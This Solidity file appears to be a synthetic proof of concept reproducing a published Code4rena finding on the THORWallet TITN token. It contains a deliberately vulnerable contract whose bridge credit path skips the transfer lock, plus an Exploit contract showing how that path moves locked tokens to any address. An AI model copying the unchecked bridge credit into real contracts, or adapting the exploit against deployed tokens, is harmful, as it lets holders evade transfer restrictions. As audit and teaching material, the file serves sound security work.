// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    THORWallet — [H-2] The user can send tokens to any address by using two
    bridge transfers, even when transfers are restricted
    (Agorist, Code4rena 2025-02-thorwallet, finding #55397)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: Titn.transfer / transferFrom call _validateTransfer (which
    reverts while isBridgedTokensTransferLocked), but the bridge path
    (_debit/_credit / mint-burn of OFT) does NOT. A user can burn on chain A
    and mint to an arbitrary recipient on chain B (or round-trip two bridges)
    to land tokens at any address — breaking the primary transfer-lock
    invariant intended to prevent pre-TGE trading.

    Vulnerable _validateTransfer is preserved verbatim in spirit; the bridge
    mint/burn path is a minimal stand-in for OFT send that skips the check.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced Titn OFT with transfer lock + unrestricted bridge credit.
contract Titn {
    string public constant name = "TITN";
    string public constant symbol = "TITN";
    uint8 public constant decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public isBridgedTokenHolder;
    bool public isBridgedTokensTransferLocked = true;
    address public owner;
    address public transferAllowedContract;
    address public lzEndpoint;

    error BridgedTokensTransferLocked();

    constructor(address _owner, address _lzEndpoint, uint256 initialMint) {
        owner = _owner;
        lzEndpoint = _lzEndpoint;
        balanceOf[_owner] = initialMint;
    }

    function setTransferAllowedContract(address c) external {
        require(msg.sender == owner, "only owner");
        transferAllowedContract = c;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _validateTransfer(msg.sender, to);
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        _validateTransfer(from, to);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    /// @dev Validates transfer restrictions (verbatim structure from Titn.sol).
    function _validateTransfer(address from, address to) internal view {
        // Arbitrum chain ID (unused in synthetic — we force the bridged-holder path)
        uint256 arbitrumChainId = 42161;
        arbitrumChainId; // silence

        if (
            from != owner && // Exclude owner from restrictions
            from != transferAllowedContract && // Allow transfers from the transferAllowedContract
            to != transferAllowedContract && // Allow transfers to the transferAllowedContract
            isBridgedTokensTransferLocked && // Check if bridged transfers are locked
            // Restrict bridged token holders OR apply Arbitrum-specific restriction
            (isBridgedTokenHolder[from] || true) && // force locked path in synthetic
            to != lzEndpoint // Allow transfers to LayerZero endpoint
        ) {
            revert BridgedTokensTransferLocked();
        }
    }

    /// @dev Bridge debit (burn) — OFT send path; NO _validateTransfer.
    function bridgeBurn(address from, uint256 amount) external {
        require(msg.sender == lzEndpoint || msg.sender == address(this), "endpoint only");
        balanceOf[from] -= amount;
    }

    /// @dev Bridge credit (mint) — OFT _credit path; NO _validateTransfer on `to`.
    ///      This is the bypass: tokens can be credited to ANY address.
    function bridgeCredit(address to, uint256 amount) public {
        // FIX: require(to == originalSender) or call _validateTransfer in credit path.
        if (to == address(0)) to = address(0xdead);
        balanceOf[to] += amount; // @> VULN: bridge mint skips _validateTransfer
        if (!isBridgedTokenHolder[to]) {
            isBridgedTokenHolder[to] = true;
        }
    }

    /// @notice Two-hop bridge stand-in: burn from sender on "chain A", credit
    ///         arbitrary `to` on "chain B" (same contract, two calls).
    function bridgeSend(address from, address to, uint256 amount) external {
        // simulates OFT send: debit local, credit remote recipient
        balanceOf[from] -= amount;
        // remote credit — unrestricted
        bridgeCredit(to, amount);
    }
}

/// @dev User who holds bridged TITN and attempts transfers / bridge sends.
contract BridgedUser {
    Titn public titn;

    constructor(Titn t) {
        titn = t;
    }

    function tryDirectTransfer(address to, uint256 amount) external returns (bool ok) {
        try titn.transfer(to, amount) {
            return true;
        } catch {
            return false;
        }
    }

    function bridgeTo(address to, uint256 amount) external {
        titn.bridgeSend(address(this), to, amount);
    }
}

/// @notice Prove: direct transfer reverts under lock; bridge path delivers to any address.
contract Exploit {
    Titn public titn; // CREATE 1
    BridgedUser public user1; // CREATE 2
    address public constant USER2 = address(0x2222);
    address public constant LZ = address(0xE1);

    uint256 public constant AMOUNT = 1 ether;

    constructor() {
        titn = new Titn(address(this), LZ, 0); // 1
        user1 = new BridgedUser(titn); // 2
        // Seed user1 as a bridged holder with AMOUNT (as if they claimed merge TITN).
        titn.bridgeCredit(address(user1), AMOUNT);
        require(titn.isBridgedTokenHolder(address(user1)), "user1 bridged");
        require(titn.balanceOf(address(user1)) == AMOUNT, "seed");
    }

    function run() external {
        // Direct transfer is locked.
        bool ok = user1.tryDirectTransfer(USER2, AMOUNT);
        require(!ok, "direct transfer should revert under lock");
        require(titn.balanceOf(USER2) == 0, "user2 empty before bridge");

        // Bridge path bypasses lock and lands tokens at USER2.
        user1.bridgeTo(USER2, AMOUNT);

        // HARM: primary invariant broken — locked holder sent tokens to any address.
        require(titn.balanceOf(USER2) == AMOUNT, "harm: user2 received via bridge");
        require(titn.balanceOf(address(user1)) == 0, "user1 drained via bridge");
        require(titn.isBridgedTokenHolder(USER2), "recipient marked bridged");
    }
}
